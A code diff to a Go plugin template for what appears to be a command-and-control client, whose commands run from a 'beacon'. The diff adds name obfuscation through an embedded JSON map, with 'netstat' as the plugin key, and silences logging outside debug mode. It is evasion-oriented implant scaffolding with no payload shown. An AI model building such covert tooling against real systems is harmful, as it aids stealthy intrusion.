@@ -1,17 +1,41 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
+	"io"
+	"strings"
 
 	"src/Client/dynamic/shared"
+	"src/Client/generic/config"
 	Logger "src/Client/generic/logger"
 
+	hclog "github.com/hashicorp/go-hclog"
 	"github.com/hashicorp/go-plugin"
 )
 
-var (
-	pluginName = "your_command_name" // Change this to a unique name for your command plugin
-)
+//go:embed obfuscate.json
+var obfuscateJSON []byte
+
+var pluginName string
+
+const pluginKey = "netstat"
+
+func init() {
+	pluginName = pluginKey
+
+	type entry struct {
+		ObfuscatedName string `json:"obfuscated_name"`
+	}
+	var m map[string]entry
+	if err := json.Unmarshal(obfuscateJSON, &m); err == nil {
+		if e, ok := m[pluginKey]; ok {
+			if n := strings.TrimSpace(e.ObfuscatedName); n != "" {
+				pluginName = n
+			}
+		}
+	}
+}
 
 // Replace 'YourCommandImpl' with the specific name for your new command.
 // This struct will implement the shared.Command interface.
@@ -58,11 +82,20 @@ func (c *YourCommandImpl) ExecuteFromBeacon(args []string, data string) (string,
 // --- Main function for the plugin executable ---
 
 func main() {
+	// Silence plugin logs unless in debug
+	var plog hclog.Logger
+	if config.IsDebug() {
+		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin.template", Level: hclog.Debug})
+	} else {
+		// hclog v1.x uses Trace/Debug/Info/Warn/Error; use NoLevel to silence, with Output discarded
+		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin.template", Level: hclog.NoLevel, Output: io.Discard})
+	}
 
 	plugin.Serve(&plugin.ServeConfig{
 		HandshakeConfig: shared.HandshakeConfig,
 		Plugins: map[string]plugin.Plugin{
 			pluginName: &shared.CommandPlugin{Impl: &YourCommandImpl{}},
 		},
+		Logger: plog,
 	})
 }
